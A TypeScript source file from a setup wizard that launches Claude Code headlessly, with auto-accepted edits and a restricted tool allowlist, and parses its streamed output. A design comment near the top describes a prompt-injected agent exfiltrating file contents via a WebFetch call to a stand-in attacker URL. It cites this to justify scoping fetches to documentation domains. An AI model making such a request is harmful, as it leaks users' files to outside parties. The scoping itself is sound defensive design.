import os from 'node:os';
import path from 'node:path';
import * as p from '@clack/prompts';
import pc from 'picocolors';
import { firstExistingPath, runTerminalAgent, sanitizeTerminalOutput, which } from './helpers.js';
import { printAgentAction, printAgentText } from './output.js';
import { extractTelemetryMarkers } from './telemetry-marker.js';
import type { AgentDefinition, LaunchContext, LaunchResult } from './types.js';

/**
 * Tools the headless run is pre-authorized to use beyond edits: docs fetching
 * and dependency installs. Telemetry needs no tool here — the agent just prints
 * markers to stdout that the wizard parses. Everything else falls back to
 * Claude Code's own permission rules.
 *
 * WebFetch is scoped to the two Subtext/Fullstory doc domains the install
 * actually needs. Leaving it unscoped would make it an exfiltration channel
 * under prompt injection (fetch `https://attacker.com/?data=<file contents>`);
 * the domain scope closes that.
 */
const ALLOWED_TOOLS = [
  'WebFetch(domain:subtext.fullstory.com)',
  'WebFetch(domain:developer.fullstory.com)',
  'Bash(npm install:*)',
  'Bash(pnpm add:*)',
  'Bash(yarn add:*)',
  'Bash(bun add:*)',
];

async function findClaudeBinary(): Promise<string | null> {
  const onPath = await which('claude');
  if (onPath) return onPath;
  return firstExistingPath([
    path.join(os.homedir(), '.claude', 'local', 'claude'),
    '/usr/local/bin/claude',
    '/opt/homebrew/bin/claude',
  ]);
}

interface StreamEvent {
  type?: string;
  subtype?: string;
  result?: string;
  message?: { content?: Array<{ type?: string; text?: string; name?: string; input?: Record<string, unknown> }> };
}

/** Raw tool line for --debug: "Read: src/app.tsx", relative to the project. */
function describeToolUse(name: string | undefined, input: Record<string, unknown>, cwd: string): string {
  const file = (input.file_path as string | undefined) ?? (input.path as string | undefined);
  const detail =
    (file ? relativeTo(cwd, file) : undefined) ??
    (typeof input.command === 'string' ? input.command.replaceAll(cwd + '/', '').slice(0, 80) : undefined) ??
    (input.pattern as string | undefined) ??
    (input.url as string | undefined) ??
    '';
  return detail ? `${name}: ${detail}` : `${name ?? 'tool'}`;
}

/** Spinner text for the action the agent just started. */
function friendlyAction(name: string | undefined, input: Record<string, unknown>, cwd: string): string {
  const file = (input.file_path as string | undefined) ?? (input.notebook_path as string | undefined);
  switch (name) {
    case 'Read':
    case 'Glob':
    case 'Grep':
    case 'LS':
      return 'Reading project files';
    case 'WebFetch':
    case 'WebSearch':
      return 'Fetching Subtext docs';
    case 'Edit':
    case 'MultiEdit':
    case 'Write':
    case 'NotebookEdit':
      return file ? `Editing ${relativeTo(cwd, file)}` : 'Editing files';
    case 'TodoWrite':
      return 'Planning';
    case 'Bash': {
      const command = typeof input.command === 'string' ? input.command : '';
      return /\b(npm (install|i)|pnpm add|yarn add|bun add)\b/.test(command) ? 'Installing dependencies' : 'Checking the project';
    }
    default:
      return 'Working';
  }
}

function relativeTo(cwd: string, file: string): string {
  const rel = path.relative(cwd, file);
  return rel && !rel.startsWith('..') ? rel : file;
}

async function launch(ctx: LaunchContext): Promise<LaunchResult> {
  // --debug keeps the old streamed view (every tool call and message); the
  // default is one spinner line naming what the agent is doing right now.
  // Without a TTY (CI, the GitHub integration) a spinner can't redraw, so log lines instead.
  const verbose = ctx.debug || !process.stdout.isTTY;
  const spinner = verbose ? undefined : p.spinner();
  if (verbose) {
    p.log.step('Running with Claude Code (headless)…');
  } else {
    spinner!.start(`${ctx.label ?? 'Working'} with Claude Code`);
  }

  let resultText: string | undefined;
  let lastAssistantText: string | undefined;
  let stderr = '';
  const exitCode = await runTerminalAgent({
    binaryPath: ctx.binaryPath!,
    args: [
      '-p',
      '--permission-mode',
      'acceptEdits',
      '--allowedTools',
      ALLOWED_TOOLS.join(','),
      // No MCP servers: the install doesn't need the user's connectors, and
      // loading them is slower and gets them mentioned in the agent's replies.
      '--strict-mcp-config',
      '--verbose',
      '--output-format',
      'stream-json',
    ],
    cwd: ctx.cwd,
    promptOnStdin: ctx.prompt,
    stdout: 'pipe',
    // Env warnings (NODE_EXTRA_CA_CERTS and friends) would break the spinner;
    // keep stderr for the failure case instead.
    onStderr: verbose ? undefined : (chunk) => {
      stderr = (stderr + chunk).slice(-4_000);
    },
    onStdoutLine: (line) => {
      if (!line.trim()) return;
      let event: StreamEvent;
      try {
        event = JSON.parse(line) as StreamEvent;
      } catch {
        if (ctx.debug) console.error(pc.dim(line));
        return;
      }
      if (event.type === 'assistant') {
        for (const block of event.message?.content ?? []) {
          if (block.type === 'text' && block.text?.trim()) {
            // The prompt has the agent print telemetry markers as plain text;
            // pull them out of the stream and display only the rest.
            const text = sanitizeTerminalOutput(
              extractTelemetryMarkers(block.text, ctx.onTelemetry),
            ).trim();
            if (text) {
              if (verbose) printAgentText(text);
              lastAssistantText = text;
            }
          } else if (block.type === 'tool_use') {
            if (verbose) printAgentAction(describeToolUse(block.name, block.input ?? {}, ctx.cwd));
            else spinner!.message(`${friendlyAction(block.name, block.input ?? {}, ctx.cwd)}…`);
            ctx.onEvent?.('agent_tool_use', { tool: block.name });
          }
        }
      } else if (event.type === 'result') {
        resultText = event.result;
      }
    },
  });

  if (spinner) {
    spinner.stop(exitCode === 0 ? 'Claude Code finished.' : `Claude Code exited with code ${exitCode}.`, exitCode === 0 ? 0 : 1);
    const tail = sanitizeTerminalOutput(stderr).trim();
    if (exitCode !== 0 && tail) p.log.message(pc.dim(tail.split('\n').slice(-15).join('\n')));
  }

  // The result event normally repeats the final assistant message; strip any
  // telemetry markers from it again (the caller dedupes re-reported ones).
  const finalMessage = resultText
    ? sanitizeTerminalOutput(extractTelemetryMarkers(resultText, ctx.onTelemetry)).trim()
    : lastAssistantText;
  return { mode: 'ran', exitCode, finalMessage: finalMessage || undefined };
}

export const claudeCode: AgentDefinition = {
  id: 'claude-code',
  name: 'Claude Code',
  kind: 'terminal',
  autonomy:
    'auto-accepting file edits and running a limited set of commands (dependency installs and Subtext doc fetches)',
  consent: 'edit files and may run npm install',
  async detect() {
    const binaryPath = await findClaudeBinary();
    if (!binaryPath) return null;
    return { definition: claudeCode, binaryPath, detail: binaryPath };
  },
  launch,
};
